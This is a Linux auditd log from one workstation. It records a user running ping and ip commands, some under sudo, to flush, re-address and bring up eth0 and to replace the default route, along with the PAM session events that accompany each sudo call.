type=USER_END msg=audit(1789327136.069:100): pid=661 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_close grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_DISP msg=audit(1789327136.069:101): pid=661 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=SYSCALL msg=audit(1789327143.037:102): arch=c000003e syscall=59 success=yes exit=0 a0=55a97a5438b0 a1=55a97a4af500 a2=55a97a447390 a3=33894510fd2ba690 items=3 ppid=630 pid=664 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ping" exe="/usr/bin/ping" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=BPRM_FCAPS msg=audit(1789327143.037:102): fver=2 fp=0000000000002000 fi=0 fe=1 old_pp=0 old_pi=0 old_pe=0 old_pa=0 pp=0000000000002000 pi=0 pe=0000000000002000 pa=0 frootid=0
type=EXECVE msg=audit(1789327143.037:102): argc=2 a0="ping" a1="github.com"
type=CWD msg=audit(1789327143.037:102): cwd="/home/Tom"
type=PATH msg=audit(1789327143.037:102): item=0 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789327143.037:102): item=1 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789327143.037:102): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789327143.037:102): proctitle=70696E67006769746875622E636F6D
type=SYSCALL msg=audit(1789327154.209:103): arch=c000003e syscall=59 success=yes exit=0 a0=55a97a447140 a1=55a97a5238f0 a2=55a97a447390 a3=33894510fd2ba690 items=3 ppid=630 pid=665 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ip" exe="/usr/bin/ip" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789327154.209:103): argc=4 a0="ip" a1="addr" a2="show" a3="eth0"
type=CWD msg=audit(1789327154.209:103): cwd="/home/Tom"
type=PATH msg=audit(1789327154.209:103): item=0 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789327154.209:103): item=1 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789327154.209:103): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789327154.209:103): proctitle=697000616464720073686F770065746830
type=SYSCALL msg=audit(1789327191.829:104): arch=c000003e syscall=59 success=yes exit=0 a0=55a97a4de950 a1=55a97a48cde0 a2=55a97a447390 a3=33894510fd2ba690 items=3 ppid=630 pid=666 auid=1000 uid=1000 gid=1000 euid=0 suid=0 fsuid=0 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="sudo" exe="/usr/bin/sudo" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="root" SUID="root" FSUID="root" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789327191.829:104): argc=6 a0="sudo" a1="ip" a2="addr" a3="flush" a4="dev" a5="eth0"
type=CWD msg=audit(1789327191.829:104): cwd="/home/Tom"
type=PATH msg=audit(1789327191.829:104): item=0 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789327191.829:104): item=1 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789327191.829:104): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789327191.829:104): proctitle=7375646F006970006164647200666C757368006465760065746830
type=USER_ACCT msg=audit(1789327191.833:105): pid=666 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_CMD msg=audit(1789327191.833:106): pid=666 uid=1000 auid=1000 ses=1 subj=unconfined msg='cwd="/home/Tom" cmd=6970206164647220666C757368206465762065746830 exe="/usr/bin/sudo" terminal=tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_REFR msg=audit(1789327191.837:107): pid=666 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_START msg=audit(1789327191.837:108): pid=666 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_open grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_END msg=audit(1789327191.841:109): pid=666 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_close grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_DISP msg=audit(1789327191.841:110): pid=666 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=SYSCALL msg=audit(1789327199.997:111): arch=c000003e syscall=59 success=yes exit=0 a0=55a97a445ed0 a1=55a97a4b3370 a2=55a97a447390 a3=33894510fd2ba690 items=3 ppid=630 pid=669 auid=1000 uid=1000 gid=1000 euid=0 suid=0 fsuid=0 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="sudo" exe="/usr/bin/sudo" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="root" SUID="root" FSUID="root" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789327199.997:111): argc=7 a0="sudo" a1="ip" a2="addr" a3="add" a4="198.51.100.21/24" a5="dev" a6="eth0"
type=CWD msg=audit(1789327199.997:111): cwd="/home/Tom"
type=PATH msg=audit(1789327199.997:111): item=0 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789327199.997:111): item=1 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789327199.997:111): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789327199.997:111): proctitle=7375646F006970006164647200616464003139382E35312E3130302E32312F3234006465760065746830
type=USER_ACCT msg=audit(1789327200.001:112): pid=669 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_CMD msg=audit(1789327200.001:113): pid=669 uid=1000 auid=1000 ses=1 subj=unconfined msg='cwd="/home/Tom" cmd=6970206164647220616464203139382E35312E3130302E32312F3234206465762065746830 exe="/usr/bin/sudo" terminal=tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_REFR msg=audit(1789327200.005:114): pid=669 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_START msg=audit(1789327200.005:115): pid=669 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_open grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_END msg=audit(1789327200.009:116): pid=669 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_close grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_DISP msg=audit(1789327200.009:117): pid=669 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=SYSCALL msg=audit(1789327204.005:118): arch=c000003e syscall=59 success=yes exit=0 a0=55a97a4883e0 a1=55a97a4cf9a0 a2=55a97a447390 a3=33894510fd2ba690 items=3 ppid=630 pid=672 auid=1000 uid=1000 gid=1000 euid=0 suid=0 fsuid=0 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="sudo" exe="/usr/bin/sudo" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="root" SUID="root" FSUID="root" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789327204.005:118): argc=6 a0="sudo" a1="ip" a2="link" a3="set" a4="eth0" a5="up"
type=CWD msg=audit(1789327204.005:118): cwd="/home/Tom"
type=PATH msg=audit(1789327204.005:118): item=0 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789327204.005:118): item=1 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789327204.005:118): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789327204.005:118): proctitle=7375646F006970006C696E6B007365740065746830007570
type=USER_ACCT msg=audit(1789327204.013:119): pid=672 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_CMD msg=audit(1789327204.013:120): pid=672 uid=1000 auid=1000 ses=1 subj=unconfined msg='cwd="/home/Tom" cmd=6970206C696E6B207365742065746830207570 exe="/usr/bin/sudo" terminal=tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_REFR msg=audit(1789327204.013:121): pid=672 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_START msg=audit(1789327204.013:122): pid=672 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_open grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_END msg=audit(1789327204.017:123): pid=672 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_close grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_DISP msg=audit(1789327204.017:124): pid=672 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=SYSCALL msg=audit(1789327208.073:125): arch=c000003e syscall=59 success=yes exit=0 a0=55a97a527900 a1=55a97a4b3370 a2=55a97a447390 a3=33894510fd2ba690 items=3 ppid=630 pid=675 auid=1000 uid=1000 gid=1000 euid=0 suid=0 fsuid=0 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="sudo" exe="/usr/bin/sudo" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="root" SUID="root" FSUID="root" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789327208.073:125): argc=7 a0="sudo" a1="ip" a2="route" a3="replace" a4="default" a5="via" a6="198.51.100.1"
type=CWD msg=audit(1789327208.073:125): cwd="/home/Tom"
type=PATH msg=audit(1789327208.073:125): item=0 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789327208.073:125): item=1 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789327208.073:125): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789327208.073:125): proctitle=7375646F00697000726F757465007265706C6163650064656661756C7400766961003139382E35312E3130302E31
type=USER_ACCT msg=audit(1789327208.081:126): pid=675 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_CMD msg=audit(1789327208.081:127): pid=675 uid=1000 auid=1000 ses=1 subj=unconfined msg='cwd="/home/Tom" cmd=697020726F757465207265706C6163652064656661756C7420766961203139382E35312E3130302E31 exe="/usr/bin/sudo" terminal=tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_REFR msg=audit(1789327208.081:128): pid=675 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_START msg=audit(1789327208.081:129): pid=675 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_open grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_END msg=audit(1789327208.085:130): pid=675 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_close grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_DISP msg=audit(1789327208.085:131): pid=675 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=SYSCALL msg=audit(1789327211.809:132): arch=c000003e syscall=59 success=yes exit=0 a0=55a97a5275b0 a1=55a97a5278a0 a2=55a97a447390 a3=33894510fd2ba690 items=3 ppid=630 pid=680 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ping" exe="/usr/bin/ping" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=BPRM_FCAPS msg=audit(1789327211.809:132): fver=2 fp=0000000000002000 fi=0 fe=1 old_pp=0 old_pi=0 old_pe=0 old_pa=0 pp=0000000000002000 pi=0 pe=0000000000002000 pa=0 frootid=0
type=EXECVE msg=audit(1789327211.809:132): argc=2 a0="ping" a1="github.com"
type=CWD msg=audit(1789327211.809:132): cwd="/home/Tom"
type=PATH msg=audit(1789327211.809:132): item=0 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789327211.809:132): item=1 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789327211.809:132): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789327211.809:132): proctitle=70696E67006769746875622E636F6D
type=SYSCALL msg=audit(1789327223.533:133): arch=c000003e syscall=59 success=yes exit=0 a0=55a97a5434e0 a1=55a97a51fcd0 a2=55a97a447390 a3=33894510fd2ba690 items=3 ppid=630 pid=681 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ip" exe="/usr/bin/ip" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789327223.533:133): argc=4 a0="ip" a1="addr" a2="show" a3="eth0"
type=CWD msg=audit(1789327223.533:133): cwd="/home/Tom"
type=PATH msg=audit(1789327223.533:133): item=0 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789327223.533:133): item=1 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789327223.533:133): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789327223.533:133): proctitle=697000616464720073686F770065746830
type=SYSCALL msg=audit(1789327233.677:134): arch=c000003e syscall=59 success=yes exit=0 a0=55a97a5278a0 a1=55a97a5278c0 a2=55a97a447390 a3=33894510fd2ba690 items=3 ppid=630 pid=682 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ping" exe="/usr/bin/ping" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=BPRM_FCAPS msg=audit(1789327233.677:134): fver=2 fp=0000000000002000 fi=0 fe=1 old_pp=0 old_pi=0 old_pe=0 old_pa=0 pp=0000000000002000 pi=0 pe=0000000000002000 pa=0 frootid=0
type=EXECVE msg=audit(1789327233.677:134): argc=2 a0="ping" a1="198.51.100.21"
type=CWD msg=audit(1789327233.677:134): cwd="/home/Tom"
type=PATH msg=audit(1789327233.677:134): item=0 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789327233.677:134): item=1 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789327233.677:134): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789327233.677:134): proctitle=70696E67003139382E35312E3130302E3231
type=SYSCALL msg=audit(1789327238.769:135): arch=c000003e syscall=59 success=yes exit=0 a0=55a97a526350 a1=55a97a462a90 a2=55a97a447390 a3=33894510fd2ba690 items=3 ppid=630 pid=683 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ping" exe="/usr/bin/ping" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=BPRM_FCAPS msg=audit(1789327238.769:135): fver=2 fp=0000000000002000 fi=0 fe=1 old_pp=0 old_pi=0 old_pe=0 old_pa=0 pp=0000000000002000 pi=0 pe=0000000000002000 pa=0 frootid=0
type=EXECVE msg=audit(1789327238.769:135): argc=2 a0="ping" a1="198.51.100.1"
type=CWD msg=audit(1789327238.769:135): cwd="/home/Tom"
type=PATH msg=audit(1789327238.769:135): item=0 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789327238.769:135): item=1 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789327238.769:135): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789327238.769:135): proctitle=70696E67003139382E35312E3130302E31
type=SYSCALL msg=audit(1789327279.577:136): arch=c000003e syscall=59 success=yes exit=0 a0=55a97a516490 a1=55a97a5205f0 a2=55a97a447390 a3=33894510fd2ba690 items=3 ppid=630 pid=684 auid=1000 uid=1000 gid=1000 euid=0 suid=0 fsuid=0 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="sudo" exe="/usr/bin/sudo" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="root" SUID="root" FSUID="root" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789327279.577:136): argc=6 a0="sudo" a1="ip" a2="addr" a3="flush" a4="dev" a5="eth0"
type=CWD msg=audit(1789327279.577:136): cwd="/home/Tom"
type=PATH msg=audit(1789327279.577:136): item=0 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789327279.577:136): item=1 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789327279.577:136): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789327279.577:136): proctitle=7375646F006970006164647200666C757368006465760065746830
type=USER_ACCT msg=audit(1789327279.585:137): pid=684 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_CMD msg=audit(1789327279.585:138): pid=684 uid=1000 auid=1000 ses=1 subj=unconfined msg='cwd="/home/Tom" cmd=6970206164647220666C757368206465762065746830 exe="/usr/bin/sudo" terminal=tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_REFR msg=audit(1789327279.585:139): pid=684 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_START msg=audit(1789327279.585:140): pid=684 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_open grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_END msg=audit(1789327279.593:141): pid=684 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_close grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_DISP msg=audit(1789327279.593:142): pid=684 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=SYSCALL msg=audit(1789327303.605:143): arch=c000003e syscall=59 success=yes exit=0 a0=55a97a4d2080 a1=55a97a4b3370 a2=55a97a447390 a3=33894510fd2ba690 items=3 ppid=630 pid=687 auid=1000 uid=1000 gid=1000 euid=0 suid=0 fsuid=0 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="sudo" exe="/usr/bin/sudo" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="root" SUID="root" FSUID="root" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789327303.605:143): argc=7 a0="sudo" a1="ip" a2="addr" a3="add" a4="192.168.0.21/24" a5="dev" a6="eth0"
